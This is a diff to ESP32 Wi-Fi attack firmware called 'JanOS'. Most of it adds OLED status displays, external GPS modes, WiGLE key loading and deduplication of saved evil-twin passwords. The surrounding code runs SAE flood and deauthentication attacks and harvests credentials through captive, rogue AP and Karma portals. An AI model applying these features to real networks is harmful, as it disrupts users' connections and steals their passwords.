+                         disp_addr_raw, disp_addr7);
+                break;
+            case DISPLAY_SH1106:
+                display_name = "SH1106";
+                snprintf(display_desc, sizeof(display_desc), "addr raw 0x%02X / 7-bit 0x%02X",
+                         disp_addr_raw, disp_addr7);
+                break;
+            case DISPLAY_UNIT_LCD:
+                display_name = "UNIT_LCD";
+                snprintf(display_desc, sizeof(display_desc), "addr 0x%02X", disp_addr7);
+                break;
+            case DISPLAY_NONE:
+            default:
+                display_name = "NONE";
+                snprintf(display_desc, sizeof(display_desc), "check display wiring / I2C");
+                break;
+        }
+        MY_LOG_INFO(TAG, "POST Display auto-detect: %s (%s)", display_name, display_desc);
+    }
     //printf("NVS initialized OK\n");
 
     channel_time_load_state_from_nvs();
     gps_load_state_from_nvs();
     led_load_state_from_nvs();
+    oled_display_update_full(NULL, "  NVS: OK", "  Init LED...", "");
+    vTaskDelay(pdMS_TO_TICKS(60));
     MY_LOG_INFO(TAG, "GPS module: %s (baud %d)",
-                (current_gps_module == GPS_MODULE_M5STACK_GPS_V11) ? "M5StackGPS1.1" : "ATGM336H",
+                gps_get_module_name(current_gps_module),
                 gps_get_baud_for_module(current_gps_module));
 
     //printf("Step 4: Init LED strip\n");
@@ -12627,6 +14613,8 @@ void app_main(void) {
     }
     //printf("Step 6: Vendor load state\n");
     MY_LOG_INFO(TAG, "Status LED ready (brightness %u%%, %s)", led_brightness_percent, led_user_enabled ? "on" : "off");
+    oled_display_update_full(NULL, "  NVS: OK", "  LED: OK", "  Init SD...");
+    vTaskDelay(pdMS_TO_TICKS(60));
     vendor_load_state_from_nvs();
     vendor_last_valid = false;
     vendor_last_hit = false;
@@ -12649,6 +14637,8 @@ void app_main(void) {
 
     esp_console_repl_t *repl = NULL;
     esp_console_repl_config_t repl_config = ESP_CONSOLE_REPL_CONFIG_DEFAULT();
+    // Keep REPL stable for heavier TLS-based commands triggered directly from CLI.
+    repl_config.task_stack_size = 8192;
      MY_LOG_INFO(TAG,"");
     MY_LOG_INFO(TAG,"Available commands:");
       MY_LOG_INFO(TAG,"  boot_button read|list|set|status");
@@ -12656,6 +14646,7 @@ void app_main(void) {
       MY_LOG_INFO(TAG,"  channel_view");
       MY_LOG_INFO(TAG,"  deauth_detector");
       MY_LOG_INFO(TAG,"  download");
+      MY_LOG_INFO(TAG,"  display set <auto|ssd1306|sh1107|sh1106|unit_lcd> | display read");
       MY_LOG_INFO(TAG,"  file_delete <path>");
       MY_LOG_INFO(TAG,"  led set <on|off> | led level <1-100> | led read");
       MY_LOG_INFO(TAG,"  list_dir <path>");
@@ -12698,15 +14689,19 @@ void app_main(void) {
       MY_LOG_INFO(TAG,"  start_sniffer_noscan");
       MY_LOG_INFO(TAG,"  start_sniffer_dog");
       MY_LOG_INFO(TAG,"  start_gps_raw");
-      MY_LOG_INFO(TAG,"  gps_set <m5|atgm>");
+      MY_LOG_INFO(TAG,"  gps_set <m5|atgm|external|cap>");
+      MY_LOG_INFO(TAG,"  set_gps_position <lat> <lon> [alt] [acc]");
+      MY_LOG_INFO(TAG,"  set_gps_position_cap <lat> <lon> [alt] [acc]");
       MY_LOG_INFO(TAG,"  start_wardrive");
       MY_LOG_INFO(TAG,"  stop");
       MY_LOG_INFO(TAG,"  vendor set <on|off> | vendor read");
       MY_LOG_INFO(TAG,"  wpasec_key set <key> | wpasec_key read");
       MY_LOG_INFO(TAG,"  wpasec_upload");
+      MY_LOG_INFO(TAG,"  wigle_key set <api_name> <api_token> | wigle_key read");
+      MY_LOG_INFO(TAG,"  wigle_upload");
 
     repl_config.prompt = ">";
-    repl_config.max_cmdline_length = 100;
+    repl_config.max_cmdline_length = 1024;  // must fit set_html chunks (~522 chars)
 
     esp_console_register_help_command();
     register_commands();
@@ -12774,17 +14769,50 @@ void app_main(void) {
                 fclose(wf);
             }
         }
+        // Check for WiGLE API credentials file on SD card (format: api_name:api_token)
+        {
+            FILE *wf = fopen("/sdcard/lab/wigle.txt", "r");
+            if (wf) {
+                static char line[256];
+                memset(line, 0, sizeof(line));
+                if (fgets(line, sizeof(line), wf)) {
+                    static char api_name[WIGLE_KEY_MAX_LEN];
+                    static char api_token[WIGLE_KEY_MAX_LEN];
+                    memset(api_name, 0, sizeof(api_name));
+                    memset(api_token, 0, sizeof(api_token));
+                    if (wigle_split_key_pair(line, api_name, sizeof(api_name), api_token, sizeof(api_token))) {
+                        if (wigle_save_key_to_nvs(api_name, api_token)) {
+                            snprintf(wigle_api_name, sizeof(wigle_api_name), "%s", api_name);
+                            snprintf(wigle_api_token, sizeof(wigle_api_token), "%s", api_token);
+                            MY_LOG_INFO(TAG, "WiGLE key updated from SD card into NVS.");
+                        } else {
+                            MY_LOG_INFO(TAG, "Failed to save WiGLE key from SD card to NVS.");
+                        }
+                    } else {
+                        MY_LOG_INFO(TAG, "Invalid /sdcard/lab/wigle.txt format. Expected: api_name:api_token");
+                    }
+                }
+                fclose(wf);
+            }
+        }
+        oled_display_update_full(NULL, "  SD: mounted", "  All systems OK", "");
     } else {
         MY_LOG_INFO(TAG, "");
         MY_LOG_INFO(TAG, "SD init error: %s", esp_err_to_name(sd_init_ret));
         MY_LOG_INFO(TAG, "SD Card not detected. Custom portals won't be available, results won't be written to files.");
         MY_LOG_INFO(TAG, "");
+        oled_display_update_full(NULL, "  SD: MISSING!", "  No file save", "");
     }
+    vTaskDelay(pdMS_TO_TICKS(400));
     
     // Load BSSID whitelist from SD card
     load_whitelist_from_sd();
     vTaskDelay(pdMS_TO_TICKS(500));
     MY_LOG_INFO(TAG,"BOARD READY");
+    oled_display_update_full("> JanOS v" JANOS_VERSION,
+                            sd_init_ret == ESP_OK ? "  SD: OK" : "  SD: MISSING!",
+                            "",
+                            "  > Ready _");
     vTaskDelay(pdMS_TO_TICKS(100));
     
 }
@@ -12972,6 +15000,13 @@ static void sae_attack_task(void *pvParameters) {
         }
         
         inject_sae_commit_frame();
+        
+        if (frame_count_check % 20 == 0) {
+            char sae_l2[64], sae_l3[64];
+            snprintf(sae_l2, sizeof(sae_l2), ">> %s", (const char *)ap_record->ssid);
+            snprintf(sae_l3, sizeof(sae_l3), "  Frames: %d", frame_count_check);
+            oled_display_update_full("> SAE Flood", sae_l2, sae_l3, "  WPA3 Overflow");
+        }
         
         // Delay to allow UART console processing (50ms gives better responsiveness)
         vTaskDelay(pdMS_TO_TICKS(50));
@@ -13491,6 +15526,8 @@ static void sniffer_channel_hop(void) {
 
 // Task that handles time-based channel hopping (independent of packet flow)
 static void sniffer_channel_task(void *pvParameters) {
+    int64_t sniff_oled_last_us = 0;
+    
     while (sniffer_active) {
         vTaskDelay(pdMS_TO_TICKS(50)); // Check every 50ms
         
@@ -13503,8 +15540,18 @@ static void sniffer_channel_task(void *pvParameters) {
         bool time_expired = (current_time - sniffer_last_channel_hop >= sniffer_channel_hop_delay_ms);
         
         if (time_expired) {
-            //MY_LOG_INFO(TAG, "Sniffer: Time-based channel hop (250ms expired)");
             sniffer_channel_hop();
+        }
+        
+        // OLED update (~500ms)
+        int64_t now_us = esp_timer_get_time();
+        if (now_us - sniff_oled_last_us > 500000) {
+            sniff_oled_last_us = now_us;
+            char l2[64], l3[64], l4[64];
+            snprintf(l2, sizeof(l2), "  Ch %d hopping", sniffer_current_channel);
+            snprintf(l3, sizeof(l3), "  AP:%d Probes:%d", sniffer_ap_count, probe_request_count);
+            snprintf(l4, sizeof(l4), "  Pkts: %lu", (unsigned long)sniff_oled_packets);
+            oled_display_update_full("> Sniffer", l2, l3, l4);
         }
     }
     
@@ -13514,6 +15561,8 @@ static void sniffer_channel_task(void *pvParameters) {
 
 static void sniffer_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
     sniffer_packet_counter++;
+    sniff_oled_packets = sniffer_packet_counter;
+    sniff_oled_dirty = true;
     
     if (!sniffer_active || sniffer_scan_phase) {
         return; // No debug logging here - too frequent
@@ -13924,6 +15973,7 @@ static void sniffer_dog_channel_hop(void) {
 // Task that handles channel hopping for sniffer_dog
 static void sniffer_dog_task(void *pvParameters) {
     (void)pvParameters;
+    int64_t sd_oled_last_us = 0;
     
     while (sniffer_dog_active) {
         vTaskDelay(pdMS_TO_TICKS(50)); // Check every 50ms
@@ -13938,6 +15988,24 @@ static void sniffer_dog_task(void *pvParameters) {
         
         if (time_expired) {
             sniffer_dog_channel_hop();
+        }
+        
+        // OLED update (~500ms)
+        int64_t now_us = esp_timer_get_time();
+        if (now_us - sd_oled_last_us > 500000) {
+            sd_oled_last_us = now_us;
+            if (sd_oled_dirty) {
+                sd_oled_dirty = false;
+                char l2[64], l3[64], l4[64];
+                snprintf(l2, sizeof(l2), "AP %s", (const char *)sd_oled_ap);
+                snprintf(l3, sizeof(l3), "ST %s", (const char *)sd_oled_sta);
+                snprintf(l4, sizeof(l4), "Ch%d #%lu %ddB", sd_oled_ch, (unsigned long)sd_oled_count, sd_oled_rssi);
+                oled_display_update_full("> Sniff Dog", l2, l3, l4);
+            } else {
+                char l3[64];
+                snprintf(l3, sizeof(l3), "  Ch %d scanning", sniffer_dog_current_channel);
+                oled_display_update_full("> Sniff Dog", "  Hunting...", l3, "  0 deauths");
+            }
         }
     }
     
@@ -14063,6 +16131,16 @@ static void sniffer_dog_promiscuous_callback(void *buf, wifi_promiscuous_pkt_typ
     wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
     deauth_sent_count++;
     
+    // Update shared OLED state for task to render
+    snprintf((char *)sd_oled_ap, sizeof(sd_oled_ap), "%02X:%02X:%02X:%02X:%02X:%02X",
+             ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5]);
+    snprintf((char *)sd_oled_sta, sizeof(sd_oled_sta), "%02X:%02X:%02X:%02X:%02X:%02X",
+             sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5]);
+    sd_oled_ch = sniffer_dog_current_channel;
+    sd_oled_rssi = pkt->rx_ctrl.rssi;
+    sd_oled_count = deauth_sent_count;
+    sd_oled_dirty = true;
+    
     (void)led_set_color(255, 0, 0); // Back to red
     
     // Log statistics for this AP-STA pair
@@ -14118,6 +16196,7 @@ static void deauth_detector_task(void *pvParameters) {
     (void)pvParameters;
     
     log_memory_info("deauth_detector_task");
+    int64_t dd_oled_last_us = 0;
     
     while (deauth_detector_active) {
         vTaskDelay(pdMS_TO_TICKS(50)); // Check every 50ms
@@ -14134,6 +16213,24 @@ static void deauth_detector_task(void *pvParameters) {
             deauth_detector_channel_hop();
             // Reset LED to yellow after channel hop (in case it was red from deauth detection)
             (void)led_set_color(255, 255, 0);
+        }
+        
+        // OLED update (~500ms)
+        int64_t now_us = esp_timer_get_time();
+        if (now_us - dd_oled_last_us > 500000) {
+            dd_oled_last_us = now_us;
+            if (dd_oled_dirty) {
+                dd_oled_dirty = false;
+                char l2[64], l3[64], l4[64];
+                snprintf(l2, sizeof(l2), ">> %s", (const char *)dd_oled_ssid);
+                snprintf(l3, sizeof(l3), "  %s", (const char *)dd_oled_bssid);
+                snprintf(l4, sizeof(l4), "Ch%d %ddB #%lu", dd_oled_ch, dd_oled_rssi, (unsigned long)dd_oled_count);
+                oled_display_update_full("> Deauth Detect", l2, l3, l4);
+            } else {
+                char l3[64];
+                snprintf(l3, sizeof(l3), "  Ch %d scanning", deauth_detector_current_channel);
+                oled_display_update_full("> Deauth Detect", "  Monitoring...", l3, "  No attacks yet");
+            }
         }
     }
     
@@ -14191,6 +16288,15 @@ static void deauth_detector_promiscuous_callback(void *buf, wifi_promiscuous_pkt
         last_led_flash_time = now;
     }
     
+    // Update shared OLED state for task to render
+    snprintf((char *)dd_oled_ssid, sizeof(dd_oled_ssid), "%s", ap_name);
+    snprintf((char *)dd_oled_bssid, sizeof(dd_oled_bssid), "%02X:%02X:%02X:%02X:%02X:%02X",
+             bssid_mac[0], bssid_mac[1], bssid_mac[2], bssid_mac[3], bssid_mac[4], bssid_mac[5]);
+    dd_oled_ch = deauth_detector_current_channel;
+    dd_oled_rssi = rssi;
+    dd_oled_count++;
+    dd_oled_dirty = true;
+    
     // Print detection: CHANNEL | AP NAME (MAC) | RSSI
     MY_LOG_INFO(TAG, "[DEAUTH] CH: %d | AP: %s (%02X:%02X:%02X:%02X:%02X:%02X) | RSSI: %d",
                deauth_detector_current_channel,
@@ -14203,10 +16309,52 @@ static void deauth_detector_promiscuous_callback(void *buf, wifi_promiscuous_pkt
 
 // === WARDRIVE HELPER FUNCTIONS ===
 
+static const char *gps_get_module_name(gps_module_t module) {
+    switch (module) {
+        case GPS_MODULE_M5STACK_GPS_V11:
+            return "M5StackGPS1.1";
+        case GPS_MODULE_EXTERNAL:
+            return "External";
+        case GPS_MODULE_EXTERNAL_CAP:
+            return "ExternalCap";
+        case GPS_MODULE_ATGM336H:
+        default:
+            return "ATGM336H";
+    }
+}
+
+static bool gps_module_uses_external_feed(gps_module_t module) {
+    return (module == GPS_MODULE_EXTERNAL || module == GPS_MODULE_EXTERNAL_CAP);
+}
+
+static bool gps_module_uses_external_cap_feed(gps_module_t module) {
+    return module == GPS_MODULE_EXTERNAL_CAP;
+}
+
+static const char *gps_external_position_command_name(gps_module_t module) {
+    return gps_module_uses_external_cap_feed(module) ? "set_gps_position_cap" : "set_gps_position";
+}
+
+static void gps_sync_from_selected_external_source(void) {
+    if (!gps_module_uses_external_feed(current_gps_module)) {
+        return;
+    }
+
+    if (gps_module_uses_external_cap_feed(current_gps_module)) {
+        current_gps = external_cap_gps_position;
+    } else {
+        current_gps = external_gps_position;
+    }
+}
+
 static int gps_get_baud_for_module(gps_module_t module) {
     switch (module) {
         case GPS_MODULE_M5STACK_GPS_V11:
             return GPS_BAUD_M5STACK;
+        case GPS_MODULE_EXTERNAL:
+        case GPS_MODULE_EXTERNAL_CAP:
+            // In external mode wardrive does not read GPS UART. Keep safe fallback.
+            return GPS_BAUD_ATGM336H;
         case GPS_MODULE_ATGM336H:
         default:
             return GPS_BAUD_ATGM336H;
@@ -14285,7 +16433,7 @@ static void gps_load_state_from_nvs(void) {
     uint8_t module_val = (uint8_t)current_gps_module;
     err = nvs_get_u8(handle, GPS_NVS_KEY_MODULE, &module_val);
     nvs_close(handle);
-    if (err == ESP_OK && module_val <= GPS_MODULE_M5STACK_GPS_V11) {
+    if (err == ESP_OK && module_val <= GPS_MODULE_EXTERNAL_CAP) {
         current_gps_module = (gps_module_t)module_val;
     }
 }
@@ -14582,11 +16730,20 @@ static const char* get_auth_mode_wiggle(wifi_auth_mode_t mode) {
 
 static bool wait_for_gps_fix(int timeout_seconds) {
     int elapsed = 0;
-    current_gps.valid = false;
     bool infinite = (timeout_seconds <= 0);
+    const bool external_feed = gps_module_uses_external_feed(current_gps_module);
+
+    if (!external_feed) {
+        current_gps.valid = false;
+    }
     
-    if (infinite) {
+    if (infinite && external_feed) {
+        MY_LOG_INFO(TAG, "Waiting for GPS fix (external feed, no timeout, use '%s' or 'stop')...",
+                    gps_external_position_command_name(current_gps_module));
+    } else if (infinite) {
         MY_LOG_INFO(TAG, "Waiting for GPS fix (no timeout, use 'stop' to cancel)...");
+    } else if (external_feed) {
+        MY_LOG_INFO(TAG, "Waiting for GPS fix (external feed, timeout: %d seconds)...", timeout_seconds);
     } else {
         MY_LOG_INFO(TAG, "Waiting for GPS fix (timeout: %d seconds)...", timeout_seconds);
     }
@@ -14597,28 +16754,44 @@ static bool wait_for_gps_fix(int timeout_seconds) {
             MY_LOG_INFO(TAG, "GPS wait: Stop requested, terminating...");
             return false;
         }
-        
-        // Read GPS data
-        int len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(1000));
-        if (len > 0) {
-            wardrive_gps_buffer[len] = '\0';
-            char* line = strtok(wardrive_gps_buffer, "\r\n");
-            while (line != NULL) {
-                if (parse_gps_nmea(line)) {
-                    if (current_gps.valid) {
-                        return true;  // GPS fix obtained
+
+        if (external_feed) {
+            gps_sync_from_selected_external_source();
+            if (current_gps.valid) {
+                return true;
+            }
+            vTaskDelay(pdMS_TO_TICKS(1000));
+        } else {
+            // Read GPS data from UART/NMEA source
+            int len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(1000));
+            if (len > 0) {
+                wardrive_gps_buffer[len] = '\0';
+                char* line = strtok(wardrive_gps_buffer, "\r\n");
+                while (line != NULL) {
+                    if (parse_gps_nmea(line)) {
+                        if (current_gps.valid) {
+                            return true;  // GPS fix obtained
+                        }
                     }
+                    line = strtok(NULL, "\r\n");
                 }
-                line = strtok(NULL, "\r\n");
             }
         }
         
         elapsed++;
         if (elapsed % 10 == 0) {  // Print status every 10 seconds
             if (infinite) {
-                MY_LOG_INFO(TAG, "Still waiting for GPS fix... (%d seconds)", elapsed);
+                if (external_feed) {
+                    MY_LOG_INFO(TAG, "Still waiting for GPS fix (external feed)... (%d seconds)", elapsed);
+                } else {
+                    MY_LOG_INFO(TAG, "Still waiting for GPS fix... (%d seconds)", elapsed);
+                }
             } else {
-                MY_LOG_INFO(TAG, "Still waiting for GPS fix... (%d/%d seconds)", elapsed, timeout_seconds);
+                if (external_feed) {
+                    MY_LOG_INFO(TAG, "Still waiting for GPS fix (external feed)... (%d/%d seconds)", elapsed, timeout_seconds);
+                } else {
+                    MY_LOG_INFO(TAG, "Still waiting for GPS fix... (%d/%d seconds)", elapsed, timeout_seconds);
+                }
             }
         }
     }
@@ -14667,8 +16840,25 @@ static void save_evil_twin_password(const char* ssid, const char* password) {
         return;
     }
     
+    // Check for duplicate before writing
+    char match_line[256];
+    snprintf(match_line, sizeof(match_line), "\"%s\", \"%s\"", ssid, password);
+    
+    FILE *file = fopen("/sdcard/lab/eviltwin.txt", "r");
+    if (file != NULL) {
+        char line[256];
+        while (fgets(line, sizeof(line), file) != NULL) {
+            if (strstr(line, match_line) != NULL) {
+                fclose(file);
+                MY_LOG_INFO(TAG, "Credentials already in eviltwin.txt, skipping");
+                return;
+            }
+        }
+        fclose(file);
+    }
+    
     // Try to open file for appending (use short name without underscore for FAT compatibility)
-    FILE *file = fopen("/sdcard/lab/eviltwin.txt", "a");
+    file = fopen("/sdcard/lab/eviltwin.txt", "a");
     if (file == NULL) {
         MY_LOG_INFO(TAG, "Failed to open eviltwin.txt for append, errno: %d (%s). Trying to create...", errno, strerror(errno));
         
@@ -14701,6 +16891,11 @@ static void save_evil_twin_password(const char* ssid, const char* password) {
 
 // Save portal form data to SD card
 static void save_portal_data(const char* ssid, const char* form_data) {
+    {
+        const char *mode_name = karma_mode_active ? "> Karma Attack" :
+                                rogueap_mode_active ? "> Rogue AP" : "> Captive Portal";
+        oled_display_update_full(mode_name, ssid ? ssid : "", "  Data received!", "  Saving to SD");
+    }
     // Initialize SD card if not already mounted
     esp_err_t ret = init_sd_card();
     if (ret != ESP_OK) {
